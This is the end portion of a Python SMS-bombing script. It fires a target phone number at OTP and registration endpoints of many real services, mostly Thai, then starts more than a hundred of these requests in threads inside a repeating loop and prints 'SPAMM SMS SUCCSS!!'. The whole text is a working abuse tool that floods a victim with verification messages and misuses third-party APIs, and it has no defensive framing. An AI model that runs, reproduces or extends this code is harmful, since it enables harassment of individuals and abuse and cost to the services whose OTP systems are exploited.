            h.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
            h.post("https://api.jobbkk.com/v1/easy/otp_code",data="mobile="+phone)
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    ha = {'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"}

    def icq():
        try:
            requests.post(f"https://u.icq.net/api/v86/rapi/auth/sendCode", headers=ha , json={"reqId": "85174-1664860517","params": {"phone": f"66{phone}","language": "en-US","route": "sms","devId": "ic1rtwz1s1Hj1O0r","application": "icq"}})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def firster():
        try:
            requests.post(f"https://graph.firster.com/graphql",headers=ha,json={"operationName": "sendOtp","variables": {"input": {"mobileNumber": phone[1:],"phoneCode": "THA-66"}},"query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def fillgoods():
        try:
            requests.post(f"https://fgproduction.api-fillgoods.com/user/send-otp",headers=ha,json={"phone_number": phone,"email": f"{token_hex(8)}1@gmail.com"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def big666():
        try:
            requests.post("https://big666.com/api/register-otp",headers=ha,json={"brands_id": "62626d6dd8db2d0012eaa37f","tel": phone,"token": 'null'})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def sfbet88():
        try:
            requests.post("https://www.sfbet88.com/service/mobile/check",headers=ha,json={"phoneNumber": "0824790959"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def gettgo():
        try:
            requests.post("https://gettgo.com/sessions/otp_for_sign_in",headers=ha, data={"mobile_number":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    for i in range(count):
        sleep(.1)
        threading.Thread(target=firster).start()
        threading.Thread(target=fillgoods).start()
        threading.Thread(target=icq).start()
        threading.Thread(target=trueh).start()
        threading.Thread(target=aisplay).start()
        threading.Thread(target=apicall).start()
        threading.Thread(target=newa).start()
        threading.Thread(target=newa1).start()
        threading.Thread(target=big666).start()
        threading.Thread(target=newa2).start()
        threading.Thread(target=newa3).start()
        threading.Thread(target=newa6).start()
        threading.Thread(target=sfbet88).start()
        threading.Thread(target=newa7).start()
        threading.Thread(target=newa8).start()
        threading.Thread(target=newa9).start()
        threading.Thread(target=newa11).start()
        threading.Thread(target=newa12).start()
        threading.Thread(target=newa13).start()
        threading.Thread(target=newa14).start()
        threading.Thread(target=gettgo).start()
        threading.Thread(target=newa15).start()
        threading.Thread(target=newa16).start()
        threading.Thread(target=newa17).start()
        threading.Thread(target=newa18).start()
        threading.Thread(target=newa19).start()
        threading.Thread(target=newa20).start()
        threading.Thread(target=newa21).start()
        threading.Thread(target=newa22).start()
        threading.Thread(target=newa24).start()
        threading.Thread(target=newa25).start()
        threading.Thread(target=newa26).start()
        threading.Thread(target=newa27).start()
        threading.Thread(target=newa28).start()
        threading.Thread(target=newa29).start()
        threading.Thread(target=newa30).start()
        threading.Thread(target=newa32).start()
        threading.Thread(target=newa33).start()
        threading.Thread(target=newa34).start()
        threading.Thread(target=newa35).start()
        threading.Thread(target=newa36).start()
        threading.Thread(target=newa37).start()
        threading.Thread(target=newa38).start()
        threading.Thread(target=newa39).start()
        threading.Thread(target=newa41).start()
        threading.Thread(target=newa40).start()
        threading.Thread(target=newa42).start()
        threading.Thread(target=cnp1).start()
        threading.Thread(target=cnp3).start()
        threading.Thread(target=cnp5).start()
        threading.Thread(target=cnp7).start()
        threading.Thread(target=cnp9).start()
        threading.Thread(target=cnp10).start()
        threading.Thread(target=cnp11).start()
        threading.Thread(target=cnp13).start()
        threading.Thread(target=cnp15).start()
        threading.Thread(target=cnp16).start()
        threading.Thread(target=cnp17).start()
        threading.Thread(target=cnp21).start()
        threading.Thread(target=cnp23).start()
        threading.Thread(target=cnp24).start()
        threading.Thread(target=cnp25).start()
        threading.Thread(target=cnp26).start()
        threading.Thread(target=cnp27).start()
        threading.Thread(target=cnp28).start()
        threading.Thread(target=cnp29).start()
        threading.Thread(target=cnp30).start()
        threading.Thread(target=cnp31).start()
        threading.Thread(target=cnp32).start()
        threading.Thread(target=x1).start()
        threading.Thread(target=x2).start()
        threading.Thread(target=x8).start()
        threading.Thread(target=x9).start()
        threading.Thread(target=x10).start()
        threading.Thread(target=api1).start()
        threading.Thread(target=api2).start()
        threading.Thread(target=api4).start()
        threading.Thread(target=api5).start()
        threading.Thread(target=api6).start()
        threading.Thread(target=api7).start()
        threading.Thread(target=api8).start()
        threading.Thread(target=api9).start()
        threading.Thread(target=api10).start()
        threading.Thread(target=api11).start()
        threading.Thread(target=api12).start()
        threading.Thread(target=api13).start()
        threading.Thread(target=api14).start()
        threading.Thread(target=api15).start()
        threading.Thread(target=api16).start()
        threading.Thread(target=api18).start()
        threading.Thread(target=api19).start()
        threading.Thread(target=api22).start()
        threading.Thread(target=api21).start()
        threading.Thread(target=api23).start()
        threading.Thread(target=api24).start()
        threading.Thread(target=api25).start()
        threading.Thread(target=api26).start()
        threading.Thread(target=api27).start()
        threading.Thread(target=api28).start()
        threading.Thread(target=api29).start()
        threading.Thread(target=api30).start()
        threading.Thread(target=api31).start()
        threading.Thread(target=api32).start()
        threading.Thread(target=api33).start()
        threading.Thread(target=api34).start()
        threading.Thread(target=api35).start()
        threading.Thread(target=api36).start()
        threading.Thread(target=api37).start()
        threading.Thread(target=api38).start()
        threading.Thread(target=api40).start()
        threading.Thread(target=api41).start()
        threading.Thread(target=api42).start()
        threading.Thread(target=api43).start()
        threading.Thread(target=api44).start()
        threading.Thread(target=api48).start()
        threading.Thread(target=api49).start()
        threading.Thread(target=api50).start()
        threading.Thread(target=api51).start()
        threading.Thread(target=api52).start()
        threading.Thread(target=api53).start()
        threading.Thread(target=api57).start()
        threading.Thread(target=api58).start()
        threading.Thread(target=api59).start()
        threading.Thread(target=api60).start()
        threading.Thread(target=api61).start()
        threading.Thread(target=api62).start()
        threading.Thread(target=api64).start()
        threading.Thread(target=api65).start()
        threading.Thread(target=api66).start()
        threading.Thread(target=api67).start()
        threading.Thread(target=api69).start()
        threading.Thread(target=api70).start()
        threading.Thread(target=api71).start()
        threading.Thread(target=api72).start()
        threading.Thread(target=api73).start()
        threading.Thread(target=api75).start()
        threading.Thread(target=api76).start()
        threading.Thread(target=api77).start()
        threading.Thread(target=api79).start()
        threading.Thread(target=api80).start()
        threading.Thread(target=api81).start()
        threading.Thread(target=api82).start()
        threading.Thread(target=api83).start()
        threading.Thread(target=api84).start()
        threading.Thread(target=api85).start()
        threading.Thread(target=api86).start()
        threading.Thread(target=api87).start()
        threading.Thread(target=api88).start()
        threading.Thread(target=api89).start()
        threading.Thread(target=api90).start()
        threading.Thread(target=api91).start()
        threading.Thread(target=api92).start()
        threading.Thread(target=api94).start()
        threading.Thread(target=api95).start()
        threading.Thread(target=api96).start()
        threading.Thread(target=api97).start()
        threading.Thread(target=api98).start()
        threading.Thread(target=api101).start()
        print('SPAMM SMS SUCCSS!! - | ', i+1)
    sleep(3)
    os.system("cls")
    AOC.start()

class AOC:
    def start():
        CNP()


AOC.start()


# Loter